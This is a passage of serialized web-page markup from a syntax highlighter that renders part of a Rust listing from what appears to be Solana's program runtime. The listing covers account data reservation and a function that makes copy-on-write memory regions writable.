token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement214\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--21\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[21]}],[\"$\",\"span\",\"code-segement216\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}],[\"$\",\"span\",\"code-segement217\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// See BorrowedAccount::make_data_mut() as to why we reserve extra\"]}],[\"$\",\"span\",\"code-segement218\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--22\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[22]}],[\"$\",\"span\",\"code-segement220\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}],[\"$\",\"span\",\"code-segement221\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// MAX_PERMITTED_DATA_INCREASE bytes here.\"]}],[\"$\",\"span\",\"code-segement222\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--23\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[23]}],[\"$\",\"span\",\"code-segement224\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                account\"]}],[\"$\",\"span\",\"code-segement225\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement226\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"reserve\"]}],[\"$\",\"span\",\"code-segement227\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement228\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MAX_PERMITTED_DATA_INCREASE\"]}],[\"$\",\"span\",\"code-segement229\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement230\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement231\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--24\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[24]}],[\"$\",\"span\",\"code-segement233\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement234\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement235\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--25\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[25]}],[\"$\",\"span\",\"code-segement237\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement238\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Ok\"]}],[\"$\",\"span\",\"code-segement239\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement240\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"account\"]}],[\"$\",\"span\",\"code-segement241\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement242\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"data_as_mut_slice\"]}],[\"$\",\"span\",\"code-segement243\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement244\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement245\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement246\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"as_mut_ptr\"]}],[\"$\",\"span\",\"code-segement247\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement248\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement249\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement250\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}],[\"$\",\"span\",\"code-segement251\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement252\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement253\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement254\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--26\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[26]}],[\"$\",\"span\",\"code-segement256\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement257\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement258\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement259\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement260\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement261\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--27\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[27]}],[\"$\",\"span\",\"code-segement263\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement264\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement265\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"?\"]}],[\"$\",\"span\",\"code-segement266\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement267\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--28\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[28]}],[\"$\",\"span\",\"code-segement269\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement270\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}],[\"$\",\"span\",\"code-segement271\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--29\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[29]}],[\"$\",\"span\",\"code-segement273\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement274\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement275\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--30\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[30]}],\"\\n\",[\"$\",\"span\",\"line-number--31\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[31]}],[\"$\",\"span\",\"code-segement279\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement280\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"fn\"]}],[\"$\",\"span\",\"code-segement281\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement282\",{\"className\":\"token token function-definition\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"ensure_writable_region\"]}],[\"$\",\"span\",\"code-segement283\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement284\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"region\"]}],[\"$\",\"span\",\"code-segement285\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement286\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement287\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement288\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryRegion\"]}],[\"$\",\"span\",\"code-segement289\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement290\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" cow_cb\"]}],[\"$\",\"span\",\"code-segement291\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement292\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement293\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement294\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Option\"]}],[\"$\",\"span\",\"code-segement295\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement296\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryCowCallback\"]}],[\"$\",\"span\",\"code-segement297\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segement298\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement299\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement300\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"-\u003e\"]}],[\"$\",\"span\",\"code-segement301\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement302\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"bool\"]}],[\"$\",\"span\",\"code-segement303\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement304\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement305\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--32\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[32]}],[\"$\",\"span\",\"code-segement307\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement308\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"match\"]}],[\"$\",\"span\",\"code-segement309\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement310\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement311\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"region\"]}],[\"$\",\"span\",\"code-segement312\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement313\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"state\"]}],[\"$\",\"span\",\"code-segement314\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement315\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"get\"]}],[\"$\",\"span\",\"code-segement316\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement317\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement318\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement319\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" cow_cb\"]}],[\"$\",\"span\",\"code-segement320\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement321\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement322\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement323\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--33\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[33]}],[\"$\",\"span\",\"code-segement325\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement326\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement327\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryState\"]}],[\"$\",\"span\",\"code-segement328\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement329\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Writable\"]}],[\"$\",\"span\",\"code-segement330\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement331\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" _\"]}],[\"$\",\"span\",\"code-segement332\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement333\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement334\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\u003e\"]}],[\"$\",\"span\",\"code-segement335\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement336\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"true\"]}],[\"$\",\"span\",\"code-segement337\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement338\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--34\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[34]}],[\"$\",\"span\",\"code-segement340\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement341\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement342\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryState\"]}],[\"$\",\"span\",\"code-segement343\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement344\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Cow\"]}],[\"$\",\"span\",\"code-segement345\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement346\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"cow_id\"]}],[\"$\",\"span\",\"code-segement347\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement348\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement349\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement350\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Some\"]}],[\"$\",\"span\",\"code-segement351\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement352\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"cb\"]}],[\"$\",\"span\",\"code-segement353\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement354\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement355\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement356\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\u003e\"]}],[\"$\",\"span\",\"code-segement357\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement358\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"match\"]}],[\"$\",\"span\",\"code-segement359\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement360\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"cb\"]}],[\"$\",\"span\",\"code-segement361\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement362\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"cow_id\"]}],[\"$\",\"span\",\"code-segement363\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement364\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement365\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement366\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--35\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[35]}],[\"$\",\"span\",\"code-segement368\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement369\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Ok\"]}],[\"$\",\"span\",\"code-segement370\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement371\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"host_addr\"]}],[\"$\",\"span\",\"code-segement372\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement373\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement374\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\u003e\"]}],[\"$\",\"span\",\"code-segement375\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement376\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement377\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--36\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[36]}],[\"$\",\"span\",\"code-segement379\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                region\"]}],[\"$\",\"span\",\"code-segement380\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement381\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"host_addr\"]}],[\"$\",\"span\",\"code-segement382\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement383\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"replace\"]}],[\"$\",\"span\",\"code-segement384\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement385\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"host_addr\"]}],[\"$\",\"span\",\"code-segement386\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement387\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement388\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--37\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[37]}],[\"$\",\"span\",\"code-segement390\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                region\"]}],[\"$\",\"span\",\"code-segement391\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement392\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"state\"]}],[\"$\",\"span\",\"code-segement393\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement394\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"replace\"]}],[\"$\",\"span\",\"code-segement395\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement396\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryState\"]}],[\"$\",\"span\",\"code-segement397\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement398\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Writable\"]}],[\"$\",\"span\",\"code-segement399\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement400\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement401\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--38\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[38]}],[\"$\",\"span\",\"code-segement403\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}],[\"$\",\"span\",\"code-segement404\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"true\"]}],[\"$\",\"span\",\"code-segement405\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--39\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[39]}],[\"$\",\"span\",\"code-segement407\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement408\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement409\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--40\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[40]}],[\"$\",\"span\",\"code-segement411\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement412\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Err\"]}],[\"$\",\"span\",\"code-segement413\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement414\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"_\"]}],[\"$\",\"span\",\"code-segement415\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement416\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement417\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\u003e\"]}],[\"$\",\"span\",\"code-segement418\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement419\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"false\"]}],[\"$\",\"span\",\"code-segement420\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement421\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--41\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[41]}],[\"$\",\"span\",\"code-segement423\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement424\",{\"className\":\"token 